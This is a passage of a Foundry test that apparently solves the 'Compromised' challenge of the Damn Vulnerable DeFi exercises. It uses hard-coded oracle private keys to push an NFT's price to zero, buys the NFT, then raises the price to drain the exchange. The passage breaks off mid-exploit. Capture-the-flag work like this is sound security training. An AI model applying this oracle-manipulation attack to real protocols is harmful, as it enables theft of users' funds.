...
contract Compromised is Test {
    ...
    function testExploit() public {
         ...
         * EXPLOIT START *
         */
        uint256 privateKey2 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        uint256 privateKey3 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
        address source2 = vm.rememberKey(privateKey2);
        address source3 = vm.rememberKey(privateKey3);
        vm.broadcast(source2);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.broadcast(source3);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.prank(attacker, attacker);
        uint256 tId = exchange.buyOne{value: attacker.balance}();
        vm.broadcast(source2);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.broadcast(source3);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.startPrank(attacker, attacker);
        damnValuableNFT.approve(address(exchange), tId);
